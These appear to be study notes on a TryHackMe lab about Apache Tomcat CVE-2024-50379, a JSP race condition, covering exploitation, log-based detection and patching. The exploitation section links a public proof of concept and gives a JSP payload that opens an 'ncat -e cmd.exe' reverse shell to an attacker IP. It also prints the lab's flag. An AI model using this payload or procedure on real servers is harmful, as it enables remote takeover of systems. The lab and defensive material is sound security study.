#Subscribers 
https://tryhackme.com/room/tomcatcve202450379

Apache Tomcat is an open-source web server and servlet container. If you are unfamiliar with the term, a **servlet** is a Java class created to run on an application server and handle client requests. It receives the client’s HTTP request, processes it, and generates the proper response. A **servlet container** provides the runtime environment for the Java servlets and manages their lifecycle.

This room is dedicated to a recent Tomcat vulnerability, [CVE-2024-50379](https://nvd.nist.gov/vuln/detail/CVE-2024-50379), that impacts the following versions of Apache Tomcat:

- Apache Tomcat 11.0.0-M1 to 11.0.1 (Fixed in 11.0.2 or later)
- Apache Tomcat 10.1.0-M1 to 10.1.33 (Fixed in 10.1.34 or later)
- Apache Tomcat 9.0.0.M1 to 9.0.97 (Fixed in 9.0.98 or later)

The CVE-2024-50379 is an example of a <span style="color:#a0f958">Time-of-check Time-of-use (TOCTOU) </span>vulnerability. A TOCTOU vulnerability arises from a race condition between checking a resource and using it. In other words, after a system checks the state of a resource and before using it, the resource changes, and the system ends using the changed resource. In this vulnerability, the TOCTOU race condition arises during the JSP (Java Server Page) compilation on case-insensitive systems, provided the default servlet has write permissions.

## technical background 

You might be asking how TOCTOU applies in this case. Before elaborating on this, we should mention that there are two main conditions for the vulnerability to be exploited on vulnerable servers:

- user modification: users can upload files or delete them
- Tomcat to run on a case-insensitive system

### user modification

First and foremost, the <span style="color:#a0f958">server allows users to upload and delete files</span>, i.e., the server is configured to accept HTTP commands such as PUT and DELETE. Writing is enabled by setting `readonly` to `false` in the `web.xml` configuration file. 

Note that the default configuration is readonly.
```xml
<init-param>
  <param-name>readonly</param-name>
  <param-value>false</param-value>
</init-param>
```

Below is an example of an insecure configuration in which the application server is set to allow writing by default.
```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>debug</param-name>
    <param-value>0</param-value>
  </init-param>
  <init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
  </init-param>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
```

### Tomcat

The second condition for exploiting this vulnerability is for <span style="color:#a0f958">Tomcat to run on a case-insensitive system</span>, such as MS Windows or macOS. When these two conditions are satisfied, exploiting this vulnerability is a matter of racing with the OS.

On case-sensitive systems like Linux, `demo.jsp` and `demo.Jsp` are two different files. Consequently, on a Linux system, it is not impossible to see `documents` and `Documents` coexisting in the same directory.

Because the MS Windows system is case-insensitive, `demo.jsp` and `demo.Jsp` cannot be two different files; however, for Tomcat, the former is a servlet that can be executed, while the latter is treated as a text file. In other words, MS Windows would treat `demo.Jsp` no different than it would treat a servlet properly named `demo.jsp`; it is Tomcat’s case sensitivity checking that will stop `demo.Jsp` from getting executed and prevent treating it as an executable file.

### demo

If we try to create the file `demo.jsp`, for example, using `curl -X PUT -d "test" http://10.10.161.103:8080/demo.jsp`  will produce an error. This error is expected as servlets can execute commands on the server side; therefore, allowing users to upload `.jsp` files gives them remote code execution (RCE) ability. In the terminal below, we see an example error.

```shell
# this errors
curl -X PUT -d "test" http://10.10.161.103:8080/demo.jsp

# works
curl -X PUT -d "test" http://10.10.161.103:8080/demo.Jsp
curl http://10.10.161.103:8080/demo.Jsp
```

If we try to access `demo.Jsp`, a case-insensitive system will see it no different than `demo.jsp`, but Tomcat case sensitivity will inspect the extension and treat it as a text file instead. It is shown that when the server is under heavy load, a race condition becomes possible. The `demo.Jsp` might get compiled and executed as a servlet. Because it is a case-insensitive system, enforcing the constraints on the servlet extension, such as `Jsp` and `JSP`, has shifted from the OS to the application server. In other words, when a system is under load, and there is a concurrent read and write of the same file, the case sensitivity checks might get bypassed, resulting in the uploaded file getting executed as a servlet.

## exploitation

POC ` git clone https://github.com/iSee857/CVE-2024-50379-PoC `

We will make two changes to this script:

- **Modify the loop counter**: In this lab environment, using the AttackBox and a target VM, we noticed that repeating each of the four requests 2000 times instead of 10000 was more efficient.
- **Change the payload**: For a more interesting exploitation, we will use a reverse shell instead of starting the Calculator on the target system.
- **Note**: We recommend using the AttackBox over local attack systems connected over VPN as the AttackBox ensures minimal latency.

**Modifying the Loop Counter**

The original PoC code repeats the `for` loop 10000 times in line 43. For better user experience and efficient results, we recommend lowering the number to 2000. The updated line is shown below:
```python
futures = []
for _ in range(2000):
futures.append(executor.submit( ... )

```

**Changing the Payload**

This PoC exploit uses a payload that opens `calc.exe`, as can be inferred from line 37. To simplify this exploitation, we have installed `ncat` on the MS Windows server. Therefore, we will replace the payload with another one that connects to the Attacker’s system. The commented-out payload and the new one are shown below.

```python
#payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"

payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.77.187 8888\"); %>"
```

Before running this PoC, we need to listen for incoming connections. Let’s start `netcat` on the AttackBox using `netcat -lvnp 8888`.

This payload uses JSP’s `Runtime.getRuntime().exec()` to execute `cmd /c start ncat -e cmd.exe 10.10.77.187 8888`. As mentioned, this is possible because we have installed `ncat` for the purpose of this demonstration.

Next, on the AttackBox, we run the exploit with the command 

```shell
python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.161.103:8080
```

- **Note 1:** Running this command will display a message like `Checking http://10.10.161.103:8080/...`, and the terminal will stop showing updates for a few minutes. During this period, the exploit code sends many requests to overload the target server and successfully produce a race condition. Please wait as the script executes while watching the terminal running the `netcat -lvnp 8888` command. Patience is key.
- **Note 2:** Because this is a race condition exploit, you might need to repeat the PoC multiple times before succeeding.

When the exploit succeeds, a connection will be established with the listening `netcat`. The terminal below shows an example.

```
What are the contents of the `flag.txt` file on the `C:\` drive?

cd C:\
dir
more flag.txt

THM{M9bN6cF3}

```

## detection 

Since the vulnerability relies on a race condition success and requires file upload for every exploitation attempt, it is easy to detect in web access logs, available by default 
```
C:\Program Files\Apache Software Foundation\Tomcat 10.1\logs
```

The simplest attack on websites with unrestricted file upload will be logged as follows:
1. **PUT** requests to upload the file with uppercase (**.Jsp** or **.JSP**) extension (`"PUT /cve.Jsp"`)
2. **GET** request to the same file immediately after, but now to the **.jsp** extension (`"GET /cve.jsp"`)
3. **GET** request is logged with either **200** or **404** status code, depending if race condition succeeded or not
4. The steps above are repeated until the race condition is successful; usually, it’s 1000 or more attempts

```
PUT /cve.Jsp HTTP/1.1" 201 -
"GET /cve.jsp HTTP/1.1" 404 749
...
"PUT /cve.Jsp HTTP/1.1" 409 654
"GET /cve.jsp HTTP/1.1" 404 749
"PUT /cve.Jsp HTTP/1.1" 204 -
"GET /cve.jsp HTTP/1.1" 404 749
"PUT /cve.Jsp HTTP/1.1" 204 -
"GET /cve.jsp HTTP/1.1" 200 32
```

Suppose the targeted web server does not allow direct file upload via PUT but still has some web upload capabilities (like picture or file upload functionality). In that case, the attack will have a similar iterative pattern: a request on the web upload form followed by the request on the uploaded malicious JSP file:

```
"POST /app/template-upload.jsp HTTP/1.1" 200 782
"GET /uploads/revshell.jsp HTTP/1.1" 404 749
"POST /app/template-upload.jsp HTTP/1.1" 200 782
"GET /uploads/revshell.jsp HTTP/1.1" 404 749
...
"POST /app/template-upload.jsp HTTP/1.1" 200 782
"GET /uploads/revshell.jsp HTTP/1.1" 200 32
```

### Detection: System Logs

In addition to web-based detections, the attack can be tracked on the OS and filesystem level using default Windows event logs or specialized tools like Sysmon. In short, the detection can be built around:

- **File Creation**: Uploaded JSP files remain inside the web root directory unless threat actors manually remove them. Any suspiciously named JSP files like `revshell.jsp` or unrecognized JSP files containing strings like `.exec()` can indicate the attack.
- **Process Execution**: Uploaded JSP files usually have to spawn a child process to achieve code execution. On Windows, seeing Apache Tomcat spawning CMD or PowerShell process might be another reliable attack indicator.

## mitigation 

It is essential to check if you have enabled write for servlets. If the default configuration is kept as is, i.e. `readonly` is not set to `false`, then you are not affected. If it is set to `false` and it is not required for your use case, then set it back to `true`.

The mitigation steps are outlined in this [official announcement](https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp). There are two main points that the users should consider. First, users should upgrade their installation of Apache Tomcat. In particular:

- Users of Apache Tomcat 11.0.0-M1 to 11.0.1 should upgrade to **11.0.3** or later.
- Users of Apache Tomcat 10.1.0-M1 to 10.1.33 should upgrade to **10.1.35** or later.
- Users of Apache Tomcat 9.0.0.M1 to 9.0.97 should upgrade to **9.0.99** or later.

Additional steps are required for users who only upgraded to 11.0.2, 10.1.34, or 9.98. In particular, users of older versions of Java should need to make the relevant explicit changes:

- On systems using Java 8 or Java 11, the system property `sun.io.useCanonCaches` should be changed from the default value and set to `false`.
- On systems using Java 17, the system property `sun.io.useCanonCaches` should be reverted to `false` if its default value has been changed.

It should be noted that Tomcat 11.0.3, 10.1.35, 9.0.99, and later include checks to ensure that `sun.io.useCanonCaches` is set appropriately.

